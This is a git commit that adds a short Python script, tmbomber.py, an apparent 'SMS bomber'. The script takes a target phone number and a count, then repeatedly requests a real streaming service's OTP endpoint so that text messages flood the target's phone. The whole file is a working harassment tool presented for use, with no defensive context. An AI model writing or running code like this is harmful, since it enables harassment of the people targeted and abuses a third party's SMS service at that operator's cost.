9cae457d8f951e4d1dfbc507ed9936676167efc6
ShTasrif <85736436+ShTasrif@users.noreply.github.com>
2021-06-11 15:29:48 +0600

    Add files via upload

---
+++ tmbomber.py
@@ -0,0 +1,11 @@
+import requests
+print ("🆃🅰🆂🆁🅸🅵 🅼🆄🅻🆃🅸🅼🅴🅳🅸🅰")
+number=str(input(" Enter The Number : "))
+
+amount=int(input(" Enter The Amount : "))
+
+api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
+
+for i in range(amount):
+	requests.get(api)
+	print(str(i+1)+" SMS Sent ✅")
